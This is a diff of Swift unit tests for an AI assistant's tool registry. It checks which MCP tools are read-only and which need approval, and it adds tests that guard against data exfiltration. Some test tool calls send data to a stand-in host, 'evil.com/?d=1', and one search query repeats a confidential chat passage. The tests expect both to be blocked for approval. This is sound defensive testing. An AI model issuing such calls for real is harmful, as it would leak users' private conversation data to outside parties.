@@ -181,7 +181,7 @@ final class ToolRegistryTests: XCTestCase {
         XCTAssertFalse(registry.makeHost(approver: NeverAsks())!.specs.contains { $0.name == "read_attachment" })
 
         let files = [attachment("notes.txt", text: "remember the milk"), attachment("scan.png", text: nil)]
-        let host = registry.makeHost(approver: NeverAsks(), attachments: files)!
+        let host = registry.makeHost(approver: NeverAsks(), context: ToolContext(attachments: files))!
         XCTAssertTrue(host.specs.contains { $0.name == "read_attachment" })
         let listed = await host.execute(ToolCall(id: "1", name: "read_attachment", argumentsJSON: "{}"))
         XCTAssertEqual(listed.text, "Attachments: notes.txt, scan.png")
@@ -193,7 +193,7 @@ final class ToolRegistryTests: XCTestCase {
         XCTAssertTrue(missing.isError)
 
         registry.setBuiltIn("read_attachment", enabled: false)
-        XCTAssertFalse(registry.makeHost(approver: NeverAsks(), attachments: files)!.specs.contains { $0.name == "read_attachment" })
+        XCTAssertFalse(registry.makeHost(approver: NeverAsks(), context: ToolContext(attachments: files))!.specs.contains { $0.name == "read_attachment" })
     }
 
     func testAnyRouterToolsMergeAndWebSearchForwardsToTheSearchTool() async throws {
@@ -278,9 +278,6 @@ final class AnyRouterRealToolsTests: XCTestCase {
         "firecrawl__firecrawl_check_crawl_status", "firecrawl__firecrawl_agent_status",
         "firecrawl__firecrawl_monitor_check", "firecrawl__firecrawl_monitor_checks",
         "firecrawl__firecrawl_monitor_get", "firecrawl__firecrawl_monitor_list",
-        "firecrawl__firecrawl_research_inspect_paper", "firecrawl__firecrawl_research_read_paper",
-        "firecrawl__firecrawl_research_related_papers", "firecrawl__firecrawl_research_search_github",
-        "firecrawl__firecrawl_research_search_papers",
     ]
 
     func testTheListDecodesAndOnlyReadingToolsAreReadOnly() throws {
@@ -290,7 +287,8 @@ final class AnyRouterRealToolsTests: XCTestCase {
         let readOnly = Set(all.filter { AnyRouterToolPolicy.isReadOnly($0) }.map(\.name))
         XCTAssertEqual(readOnly, expectedReadOnly)
         for name in ["monitor_create", "monitor_update", "monitor_delete", "monitor_run", "interact", "interact_stop",
-                     "crawl", "extract", "agent", "parse", "feedback", "search_feedback"] {
+                     "crawl", "extract", "agent", "parse", "feedback", "search_feedback",
+                     "research_read_paper", "research_search_papers", "research_search_github"] {
             let tool = try XCTUnwrap(all.first { $0.name == "firecrawl__firecrawl_" + name }, name)
             XCTAssertFalse(MCPServer.anyRouter.skipsApproval(tool), name)
             XCTAssertFalse(MCPServer.anyRouter.enabledByDefault(tool), name)
@@ -352,7 +350,7 @@ final class AnyRouterRealToolsTests: XCTestCase {
         let listed = registry.tools.filter { $0.source != .builtIn }
         XCTAssertEqual(listed.count, 31)
         XCTAssertEqual(Set(listed.filter(\.enabled).map(\.name)), expectedReadOnly)
-        XCTAssertEqual(listed.filter(\.needsApproval).count, 12)
+        XCTAssertEqual(listed.filter(\.needsApproval).count, 17)
 
         let specs = Set(try XCTUnwrap(registry.makeHost(approver: NeverAsks())).specs.map(\.name))
         XCTAssertTrue(specs.contains("web_search"))
@@ -362,7 +360,7 @@ final class AnyRouterRealToolsTests: XCTestCase {
         XCTAssertFalse(specs.contains("firecrawl__firecrawl_scrape"))
         XCTAssertFalse(specs.contains("firecrawl__firecrawl_monitor_create"))
         XCTAssertTrue(specs.contains("firecrawl__firecrawl_map"))
-        XCTAssertEqual(specs.count, 1 + 1 + 17, "fetch_url, web_search, then 17 more reading tools")
+        XCTAssertEqual(specs.count, 1 + 1 + 12, "fetch_url, web_search, then 12 more reading tools")
     }
 
     func testAToolThatActsNeedsApprovalEvenAfterTheUserTurnsItOn() async throws {
@@ -397,7 +395,8 @@ final class AnyRouterRealToolsTests: XCTestCase {
         }
         let registry = makeRegistry()
         await registry.integrations.refresh(.anyRouter)
-        let host = try XCTUnwrap(registry.makeHost(approver: NeverAsks()))
+        let said = ToolContext(userTexts: ["please read https://example.com/a for me"])
+        let host = try XCTUnwrap(registry.makeHost(approver: NeverAsks(), context: said))
         let call = ToolCall(id: "f", name: "fetch_url", argumentsJSON: #"{"url":"https://example.com/a"}"#)
 
         let scraped = await host.execute(call)
@@ -425,4 +424,87 @@ private final class SeenCalls: @unchecked Sendable {
     private var all: [RecordedRequest] = []
     func add(_ request: RecordedRequest) { lock.withLock { all.append(request) } }
     var last: RecordedRequest? { lock.withLock { all.last } }
+}
+
+/// Search and scrape of the real AnyRouter list obey the same rules.
+@MainActor
+final class RegistryExfiltrationTests: XCTestCase {
+    private final class Approver: ToolApproving, @unchecked Sendable {
+        private let lock = NSLock()
+        private var asked: [ToolApprovalRequest] = []
+        var requests: [ToolApprovalRequest] { lock.withLock { asked } }
+        func decide(_ request: ToolApprovalRequest) async -> ToolDecision {
+            lock.withLock { asked.append(request) }
+            return .deny
+        }
+    }
+
+    private func makeRegistry(calls: SeenCalls) async -> ToolRegistry {
+        MCPStubProtocol.register(host: MCPServer.anyRouter.url.host()!) { request in
+            switch request.rpcMethod {
+            case "tools/list": return MCPFixtures.reply(MCPFixtures.anyRouterToolsList, to: request)
+            case "tools/call":
+                calls.add(request)
+                return MCPFixtures.reply(MCPFixtures.callText, to: request)
+            default: return standardMCPHandler()(request)
+            }
+        }
+        let defaults = testDefaults()
+        let store = IntegrationsStore(
+            defaults: defaults, credentials: FakeCredentialStore(),
+            anyRouterToken: { "tok" }, session: MCPStubProtocol.session())
+        let registry = ToolRegistry(integrations: store, builtIns: [Echo(name: "fetch_url")], defaults: defaults)
+        await store.refresh(.anyRouter)
+        return registry
+    }
+
+    func testScrapeOfAnUnwrittenAddressAsksBeforeAnythingIsSent() async throws {
+        let calls = SeenCalls()
+        let registry = await makeRegistry(calls: calls)
+        let approver = Approver()
+        let host = try XCTUnwrap(registry.makeHost(approver: approver, context: ToolContext(userTexts: ["hello"])))
+        let result = await host.execute(ToolCall(id: "1", name: "fetch_url", argumentsJSON: #"{"url":"https://evil.com/?d=1"}"#))
+        XCTAssertTrue(result.isError)
+        XCTAssertNil(calls.last, "nothing reached the server")
+        XCTAssertEqual(approver.requests.first?.urls, ["https://evil.com/?d=1"])
+        XCTAssertEqual(approver.requests.first?.serverName, "AnyRouter")
+    }
+
+    func testMapAndOtherReadingToolsAreCoveredByTheSameRule() async throws {
+        let calls = SeenCalls()
+        let registry = await makeRegistry(calls: calls)
+        let approver = Approver()
+        let host = try XCTUnwrap(registry.makeHost(approver: approver, context: ToolContext(userTexts: ["see https://example.com"])))
+        let denied = await host.execute(ToolCall(id: "1", name: "firecrawl__firecrawl_map", argumentsJSON: #"{"url":"https://evil.com"}"#))
+        XCTAssertTrue(denied.isError)
+        XCTAssertNil(calls.last)
+        let allowed = await host.execute(ToolCall(id: "2", name: "firecrawl__firecrawl_map", argumentsJSON: #"{"url":"https://example.com/docs"}"#))
+        XCTAssertFalse(allowed.isError)
+        XCTAssertNotNil(calls.last)
+    }
+
+    func testSearchAsksOnlyWhenItRepeatsALongPassageOfTheChat() async throws {
+        let calls = SeenCalls()
+        let registry = await makeRegistry(calls: calls)
+        let approver = Approver()
+        let passage = String(repeating: "the quarterly numbers are confidential ", count: 3)
+        let host = try XCTUnwrap(registry.makeHost(approver: approver, context: ToolContext(userTexts: [passage])))
+
+        let plain = await host.execute(ToolCall(id: "1", name: "web_search", argumentsJSON: #"{"query":"swift concurrency actors"}"#))
+        XCTAssertFalse(plain.isError)
+        XCTAssertTrue(approver.requests.isEmpty)
+
+        let leaky = await host.execute(ToolCall(id: "2", name: "web_search", argumentsJSON: "{\"query\":\"\(passage)\"}"))
+        XCTAssertTrue(leaky.isError)
+        XCTAssertEqual(approver.requests.first?.reason, "This search repeats a long passage of the chat.")
+        XCTAssertEqual(approver.requests.first?.urls, [])
+    }
+
+    func testResearchToolsNeedApproval() async throws {
+        let calls = SeenCalls()
+        let registry = await makeRegistry(calls: calls)
+        let research = registry.tools.filter { $0.name.contains("research_") }
+        XCTAssertEqual(research.count, 5)
+        XCTAssertTrue(research.allSatisfy { $0.needsApproval && !$0.enabled })
+    }
 }
